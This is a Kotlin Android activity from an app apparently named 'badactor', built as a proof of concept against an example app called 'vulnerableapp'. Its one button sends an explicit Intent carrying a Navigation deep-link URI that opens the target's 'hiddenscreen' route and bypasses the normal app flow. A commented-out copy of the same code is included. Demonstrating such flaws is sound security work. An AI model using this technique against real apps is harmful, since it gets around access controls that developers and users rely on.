package com.example.badactor

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.ui.Modifier
import com.example.badactor.ui.theme.BadActorTheme

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            BadActorTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Button(onClick = {

/*
                        val packageName = "com.example.vulnerableapp"
                        val activityClass = "MainActivity"
                        val targetRoute = "hiddenscreen"

                        val badIntent = Intent().apply {
                            setClassName(packageName, "$packageName.$activityClass")
                            data = Uri.parse("android-app://androidx.navigation/$targetRoute")
                        }
                        startActivity(badIntent)
*/


                        val badIntent = Intent().apply {
                            setClassName("com.example.vulnerableapp", "com.example.vulnerableapp.MainActivity")
                            data = Uri.parse("android-app://androidx.navigation/hiddenscreen")
                        }
                        startActivity(badIntent)
                    }) {
                        Text("Open hidden screen", modifier = Modifier.padding(innerPadding))
                    }
                }
            }
        }
    }
}
